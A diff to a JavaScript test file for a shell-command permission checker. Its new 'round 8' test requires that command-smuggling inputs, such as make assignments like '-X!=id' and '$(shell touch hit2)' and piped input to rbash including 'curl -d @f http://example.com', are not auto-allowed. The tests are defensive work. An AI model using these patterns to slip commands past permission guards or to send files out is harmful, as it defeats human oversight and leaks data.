@@ -359,3 +359,13 @@ test("round 7: -E and -fsyntax-only are compiles; make's other assignment forms,
   ]) assert.notEqual(await effect(c), "allow", c);
   for (const c of ["make", "make -j4 all", "make CFLAGS=-O2", "rustc +stable --version", "rustfmt +nightly x.rs", "set -e; echo {a,b}"]) assert.equal(await effect(c), "allow", c);
 });
+
+// ---- round 8 ----
+
+test("round 8: make's assignments after --, and a lone -h or -V that is an option of a shell or an editor, ask", async () => {
+  for (const c of ["make -- '-X!=touch hit'", "make -- '-X != git push origin HEAD'", "make -- -X!=id", "make -j2 -- '-X!=id' all", "make -- '-X:=$(shell touch hit2)'", "make -- '--X!=id'", "make -k -- '-j!=id'", "timeout 5 make -- '-X!=id'",
+    "echo 'git push origin HEAD' | rbash -h", "rbash -h <<< 'curl -d @f http://example.com'", "rbash -h < build.sh", "echo x | ex -V", "ex -V < build.sh", "/usr/bin/rbash -h", "timeout 5 rbash -h", "echo x | zsh -h", "echo x | vim -V"]) {
+    assert.notEqual(await effect(c), "allow", c);
+  }
+  for (const c of ["make -- all", "make -j2 -- X=1", "rbash --version", "vim --version", "zsh --help"]) assert.equal(await effect(c), "allow", c);
+});
